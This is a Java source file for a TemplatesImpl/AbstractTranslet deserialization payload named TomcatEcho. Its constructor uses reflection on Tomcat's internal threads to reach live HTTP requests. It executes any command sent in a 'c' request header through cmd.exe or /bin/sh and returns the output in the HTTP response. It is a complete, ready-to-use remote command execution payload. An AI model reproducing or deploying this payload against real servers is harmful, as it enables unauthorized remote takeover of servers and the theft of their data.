package com.sorry.utils.templatesimpl;

/**
 * created by 0x22cb7139 on 2021/7/26
 */
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

public class TomcatEcho extends AbstractTranslet {

    public TomcatEcho() throws Exception {
        boolean flag = false;
        Thread[] threads = (Thread[])getFV(Thread.currentThread().getThreadGroup(), "threads");

        for(int i = 0; i < threads.length; ++i) {
            Thread thread = threads[i];
            if (thread != null) {
                String name = thread.getName();
                if (!name.contains("exec") && name.contains("http")) {
                    Object runnable = getFV(thread, "target");
                    if (runnable instanceof Runnable) {
                        try {
                            runnable = getFV(getFV(getFV(runnable, "this$0"), "handler"), "global");
                        } catch (Exception flag3) {
                            continue;
                        }

                        java.util.List processors = (java.util.List)getFV(runnable, "processors");
                        for(int j = 0; j < processors.size(); ++j) {
                            Object flag0 = processors.get(j);
                            Object request = getFV(flag0, "req");
                            Object response = request.getClass().getMethod("getResponse",new Class[0]).invoke(request,new Object[0]);
                            String cmd;
                            cmd = (String)request.getClass().getMethod("getHeader", new Class[]{String.class}).invoke(request, new Object[]{new String("techo")});
                            if (cmd != null && !cmd.isEmpty()) {
                                response.getClass().getMethod("setStatus", new Class[]{Integer.TYPE}).invoke(response, new Object[]{new Integer(200)});
                                response.getClass().getMethod("addHeader", new Class[]{String.class, String.class}).invoke(response, new Object[]{new String("techo"), cmd});
                                flag = true;
                            }
                            cmd = (String)request.getClass().getMethod("getHeader", new Class[]{String.class}).invoke(request, new Object[]{new String("c")});
                            if (cmd != null && !cmd.isEmpty()) {
                                response.getClass().getMethod("setStatus", new Class[]{Integer.TYPE}).invoke(response, new Object[]{new Integer(200)});
                                String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd};
                                writeBody(response, (new java.util.Scanner((new ProcessBuilder(cmds)).start().getInputStream())).useDelimiter("\\A").next().getBytes());
                                flag = true;
                            }

                            if (flag) {
                                break;
                            }
                        }

                        if (flag) {
                            break;
                        }
                    }
                }
            }
        }

    }


    public static Object getFV(Object obj,String fieldName) throws Exception{
        java.lang.reflect.Field f0 = null;
        Class clas = obj.getClass();
        while (clas != Object.class){
            try{
                f0 = clas.getDeclaredField(fieldName);
                break;
            } catch (NoSuchFieldException e){
                clas = clas.getSuperclass();
            }
        }

        if (f0 != null){
            f0.setAccessible(true);
            return f0.get(obj);
        }else {
            throw new NoSuchFieldException(fieldName);
        }
    }

    private static void writeBody(Object response, byte[] result) throws Exception {
        Object byteChunk;
        Class clazz;
        try {
            clazz = Class.forName("org.apache.tomcat.util.buf.ByteChunk");
            byteChunk = clazz.newInstance();
            clazz.getDeclaredMethod("setBytes", new Class[]{byte[].class, Integer.TYPE, Integer.TYPE}).invoke(byteChunk, new Object[]{result, new Integer(0), new Integer(result.length)});
            response.getClass().getMethod("doWrite", new Class[]{clazz}).invoke(response, new Object[]{byteChunk});
        } catch (ClassNotFoundException e1) {
            clazz = Class.forName("java.nio.ByteBuffer");
            byteChunk = clazz.getDeclaredMethod("wrap", new Class[]{byte[].class}).invoke(clazz, new Object[]{result});
            response.getClass().getMethod("doWrite", new Class[]{clazz}).invoke(response, new Object[]{byteChunk});
        } catch (NoSuchMethodException e2) {
            clazz = Class.forName("java.nio.ByteBuffer");
            byteChunk = clazz.getDeclaredMethod("wrap", new Class[]{byte[].class}).invoke(clazz, new Object[]{result});
            response.getClass().getMethod("doWrite", new Class[]{clazz}).invoke(response, new Object[]{byteChunk});
        }

    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}